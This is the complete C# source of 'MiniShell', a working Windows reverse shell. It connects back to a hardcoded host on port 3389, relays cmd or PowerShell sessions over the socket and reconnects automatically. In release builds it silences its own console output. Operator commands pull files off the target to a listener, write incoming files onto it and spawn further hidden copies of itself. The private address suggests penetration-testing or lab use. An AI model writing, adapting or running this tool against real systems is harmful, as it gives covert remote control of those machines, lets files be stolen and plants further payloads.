#define ENABLE_META
#define ENABLE_META_GET
#define ENABLE_META_PID
#define ENABLE_META_PUT

#define ENABLE_FILENAME_ARGSG

// compile to native with:  dotnet publish -r win-x64 -c Debug -f net8 -p:PublishAot=true --self-contained


using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Security.Cryptography;
using System.Text;

namespace MiniShell {
    internal enum InterpreterType {
        PS,
        CMD
    }

    class MiniShell {

        public const string LHOST = "192.168.45.203";
        public const int LPORT = 3389;

        public const int RCV_BUF_SIZE = 1 << 16;
        public const int RCV_FILE_BUF_SIZE = 1 << 20;

        InterpreterType interpreterType = InterpreterType.CMD;

#if ENABLE_META
        public const string META_CANCEL = ":c";
        public const string META_DUP = ":dup";
        public const string META_EXIT = ":exit";
#if ENABLE_META_GET
        public const string META_GET = ":get";
#endif
#if ENABLE_META_PID
        public const string META_PID = ":pid";
#endif
#if ENABLE_META_PUT
        public const string META_PUT = ":put";
#endif
#endif

        private CommandInterpreter interpreter;
        private Socket sock;
        private string ip;
        private int port;
        private int reconnectTimeoutMs = 5000;
        private int connectionTimeoutMs = 4000;


        private static bool parsePort(string portSpec, out int port) {
            return Int32.TryParse(portSpec, out port) && port >= 0 & port < (1 << 16);
        }
        private void parseArgs(string imgPath, string[] cmdlineArgs) {
            string fileName = Path.GetFileName(imgPath).Replace(".exe", "");
            string[] parts = fileName.Split('-');
            List<string> combinedArgs = new List<string>();
            foreach (string p in parts) {
                if (p.StartsWith("h") || p.StartsWith("p")) {
                    combinedArgs.Add(p.Substring(1));
                }
            }
            combinedArgs.AddRange(cmdlineArgs);

            int port;
            foreach (string arg in combinedArgs) {
                if (parsePort(arg, out port)) {
                    this.port = port;
                } else { 
                    this.ip = arg;
                }
            }
        } 

        public MiniShell(string ip = LHOST, int port = LPORT) {
            this.sock = null;
            this.ip = ip;
            this.port = port;
        }

#if ENABLE_META && (ENABLE_META_GET || ENABLE_META_PUT)
        private static string getPath(string workingDir, string pathDescription) {
            return Path.IsPathRooted(pathDescription) ? pathDescription : Path.Combine(workingDir, pathDescription);
        }
#endif

        private static int stringToPortWithDefault(string portDescription, int defaultPort) {
            int port = -1;
            Int32.TryParse(portDescription, out port);
            return port > 0 && port < (1 << 16) ? port : defaultPort;
        }

#if ENABLE_META && (ENABLE_META_GET || ENABLE_META_PUT)
        private static byte[] computeFileHash(string path) {
            try {
                using (FileStream stream = File.OpenRead(path)) {
                    var sha256 = new SHA256Managed();
                    return sha256.ComputeHash(stream);
                }
            } catch (Exception e) {
                return new byte[0];
            }
        }
#endif

        private static bool isConnected(Socket socket) {
            try {
                return !(socket.Poll(1000, SelectMode.SelectRead) && socket.Available == 0);
            } catch (SocketException) {
                return false; 
            }
        }

        /* 
         * Can be called with 0, 1 or 2 arguments:
         * MiniShell.exe -> hardcoded default port and host
         * MiniShell.exe <port> -> hardcoded default host but given port
         * MiniShell.exe <host> <port> -> given host and port
         */
        static void Main(string[] args) {
#if !DEBUG
            Console.SetOut(TextWriter.Null);
            Console.SetError(TextWriter.Null);
#endif
            MiniShell shell = new MiniShell();
            string imgPath = System.Reflection.Assembly.GetEntryAssembly().Location;
            shell.parseArgs(imgPath, args);
            shell.start();
        }

        private CommandInterpreter newInterpreter(InterpreterType type) {
            switch (type) {
                case InterpreterType.PS:
                    return new Powershell();
                case InterpreterType.CMD:
                    return new Cmd();
                default:
                    return new Powershell();
            }
        }

        private void setupInterpreter(InterpreterType interpreter = InterpreterType.CMD) {
            this.interpreter = newInterpreter(interpreter);
            this.interpreter.start();

            this.interpreter.addStdoutCallback(output => {
                try {
                    // sock may be set to null in the event of a disconnect
                    sock?.Send(Encoding.ASCII.GetBytes($"{output}\n"));
                } catch (Exception e) {
                    Console.WriteLine($"Exception in OutputDataReceived: {e.Message}");
                }
            });

            this.interpreter.addStderrCallback(output => {
                try {
                    // sock may be set to null in the event of a disconnect
                    sock?.Send(Encoding.ASCII.GetBytes($"[ERR] {output}\n"));
                } catch (Exception e) {
                    Console.WriteLine($"Exception in OutputDataReceived: {e.Message}");
                }
            });
        }

        private void start() {
            this.sock = connectWithTimeout(this.ip, this.port, this.connectionTimeoutMs);
            setupInterpreter();

            if (sock == null) {
                Console.WriteLine($"Connection timeout after {this.connectionTimeoutMs}ms: {ip}:{port}");
                return;
            }

            byte[] buf = new byte[RCV_BUF_SIZE];
            bool stop = false;
            while (true) {
                try {
                    if (!isConnected(sock) && !handleDisconnect()) {
                        break;
                    }
                    int received = sock.Receive(buf);
                    string input = Encoding.ASCII.GetString(buf, 0, received);
                    Array.Clear(buf, 0, received);
                    string msg = handleMeta(input);
                    if (msg == null) {
                        this.interpreter.writeStdin(input);
                    } else {
                        sock.Send(Encoding.ASCII.GetBytes($"{msg}"));
                    }
                    if (!this.interpreter.istRunning()) {
                        stop = handleShellExit();
                    }
                } catch (SocketException e) {
                   if (!handleDisconnect()) {
                        break;
                    }
                } catch (Exception e) {
                    Console.WriteLine($"Exception in main loop: {e.Message}");
                }
            }

            this.sock?.Close();
        }

        private bool handleDisconnect() {
            try {
                this.sock.Shutdown(SocketShutdown.Both);
            } catch (Exception eShutdown) {
                Console.WriteLine($"Exception on shutdown: {eShutdown.Message}");
            }
            this.sock.Close();
            this.sock = null;
            if (this.reconnectTimeoutMs > 0) {
                while (this.sock == null) {
                    Console.WriteLine($"Reconnection attempt in {this.reconnectTimeoutMs}ms to {this.ip}:{this.port}");
                    Thread.Sleep(this.reconnectTimeoutMs);
                    this.sock = connectWithTimeout(this.ip, this.port, this.connectionTimeoutMs);
                }
            } else {
                return false;
            }
            return true;
        }

        private Socket connectWithTimeout(string ip, int port, int msTimeout) {
            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            var result = socket.BeginConnect(ep, null, null);
            bool success = result.AsyncWaitHandle.WaitOne(msTimeout);
            if (success && socket.Connected) {
                return socket;
            }
            socket.Close();
            return null;
        }

        private bool handleShellExit() {
            return true;
        }

        string handleMeta(string metaCmd) {
#if ENABLE_META
            bool matchesCommand(string cmd, string cmdOption) {
                cmd = cmd.ToLower().Trim();
                return cmd == cmdOption || cmd.StartsWith($"{cmdOption} ");
            }

            if (matchesCommand(metaCmd, META_CANCEL)) {
                return handleMetaCancel(metaCmd);
            }
            else if (matchesCommand(metaCmd, META_DUP)) {
                return handleMetaDuplicate(metaCmd);
            }
            else if (matchesCommand(metaCmd, META_EXIT)) {
                return handleMetaExit(metaCmd);
            } 

#if ENABLE_META_GET
            else if (matchesCommand(metaCmd, META_GET)) {
                return handleMetaGet(metaCmd);
            }
#endif
#if ENABLE_META_PID
            else if (matchesCommand(metaCmd, META_PID)) {
                return handleMetaPID(metaCmd);
            }
#endif
#if ENABLE_META_PUT
            else if (matchesCommand(metaCmd, META_PUT)) {
                return handleMetaPut(metaCmd);
            }
#endif
#endif
            return null;
        }

#if ENABLE_META
        string handleMetaCancel(string metaCmd) {
            string[] args = metaCmd.Trim().Split(null);
            InterpreterType intType = this.interpreterType;
            if (args.Length == 2) {
                string interpreterSpec = args[1].ToLower();
                if (interpreterSpec == "powershell" || interpreterSpec == "psh" || interpreterSpec == "ps") {
                    intType = InterpreterType.PS;
                } else if (interpreterSpec == "cmd") {
                    intType = InterpreterType.CMD;
                }
            }

            CommandInterpreter oldInterpreter = this.interpreter;
            setupInterpreter(intType);
            oldInterpreter.exit();
            return "Connected new command interpreter\n";
        }
#endif

#if ENABLE_META
        string handleMetaExit(string metaCmd) {
            try {
                this.interpreter.exit();
                Environment.Exit(0);
            } catch (Exception e) {
                return e.Data.ToString();
            }
            this.reconnectTimeoutMs = 0;
            return "";
        }
#endif

#if ENABLE_META
        string handleMetaDuplicate(string metaCmd) {
            string[] args = metaCmd.Trim().Split(null);
            string portDescription = this.port.ToString();
            string hostDescription = this.ip;
            if (args.Length == 2) {
                portDescription = args[1];
            } else if (args.Length >= 3) {
                hostDescription = args[1];
                portDescription = args[2];
            }

            int port = stringToPortWithDefault(portDescription, this.port);
            string minishellPath = System.Reflection.Assembly.GetEntryAssembly().Location;

            Process shell = new Process();
            shell.StartInfo = new ProcessStartInfo(minishellPath, $"{hostDescription} {port}");
            shell.StartInfo.CreateNoWindow = true;
            shell.StartInfo.UseShellExecute = false;
            shell.StartInfo.RedirectStandardInput = true;
            shell.StartInfo.RedirectStandardOutput = true;
            shell.StartInfo.RedirectStandardError = true;
            shell.Start();
            return $"dup successful: {minishellPath} {hostDescription} {port}\n";
        }
#endif

#if ENABLE_META && ENABLE_META_GET
        /*
         * Tries to connect back to a given port and host and 
         * pushes the content of the file into the TCP connection.
         * By default, the same host and port the shell is connected to is used.
         */
        string handleMetaGet(string metaCmd) {
            string[] args = metaCmd.Trim().Split(null);
            string portDescription = this.port.ToString();
            string hostDescription = this.ip;
            string pathDescription = null;
            if (args.Length <= 1) {
                return $"Usage: {args[0]} [[host] port] path";
            } else if (args.Length == 2) {
                pathDescription = args[1];
            } else if (args.Length == 3) {
                portDescription = args[1];
                pathDescription = args[2];
            } else if (args.Length >= 4) {
                hostDescription = args[1];
                portDescription = args[2];
                pathDescription = args[3];
            }

            int port = stringToPortWithDefault(portDescription, this.port);
            string path = getPath(this.interpreter.getCwd(), pathDescription);

            if (!File.Exists(path)) {
                return $"File {path} not found";
            }

            try {
                using (Socket fileSocket = connectWithTimeout(hostDescription, port, this.connectionTimeoutMs)) {
                    if (fileSocket == null) {
                        return $"Connection to {hostDescription}:{port} failed. Is a listener running?";
                    }
                    fileSocket.SendFile(path);
                }
            } catch (Exception e) {
                return e.Data.ToString();
            }

            byte[] hashValue = computeFileHash(path);
            string msg = $"Sent {path} to {hostDescription}:{portDescription}\n";
            msg += $"sha256sum: {BitConverter.ToString(hashValue).Replace("-", "").ToLower()}";
            return msg;
        }
#endif
#if ENABLE_META && ENABLE_META_PID
        string handleMetaPID(string metaCmd) {
            return $"{Process.GetCurrentProcess().Id.ToString()}\n";
        }
#endif

#if ENABLE_META && ENABLE_META_PUT
        /*
         * Tries to connect back to a given port and host,  
         * reads from the connection an writes the data to the given path.
         * By default, the same host and port the shell is connected to is used.
         */
        string handleMetaPut(string metaCmd) {
            string[] args = metaCmd.Trim().Split(null);
            string portDescription = this.port.ToString();
            string hostDescription = this.ip;
            string pathDescription = null;
            if (args.Length <= 1) {
                return $"Usage: {args[0]} [[host] port] path";
            } else if (args.Length == 2) {
                pathDescription = args[1];
            } else if (args.Length == 3) {
                portDescription = args[1];
                pathDescription = args[2];
            } else if (args.Length >= 4) {
                hostDescription = args[1];
                portDescription = args[2];
                pathDescription = args[3];
            }

            int port = stringToPortWithDefault(portDescription, this.port);
            string path = getPath(this.interpreter.getCwd(), pathDescription);

            try {
                using (FileStream fStrem = File.Create(path))
                using (Socket fileSocket = connectWithTimeout(hostDescription, port, this.connectionTimeoutMs)) {
                    if (fileSocket == null) {
                        return $"Connection to {portDescription}:{port} failed. Is a listener running?";
                    }
                    byte[] buf = new byte[RCV_FILE_BUF_SIZE];
                    int bytesRead = 0;
                    while ((bytesRead = fileSocket.Receive(buf)) > 0) {
                        fStrem.Write(buf, 0, bytesRead);
                    }
                }
            } catch (Exception e) {
                return e.Data.ToString();
            }

            byte[] hashValue = computeFileHash(path);
            string msg = $"Received from {hostDescription}:{port} and wrote to {path}\n";
            msg += $"sha256sum: {BitConverter.ToString(hashValue).Replace("-", "").ToLower()}";
            return msg;
        }
#endif

    }
}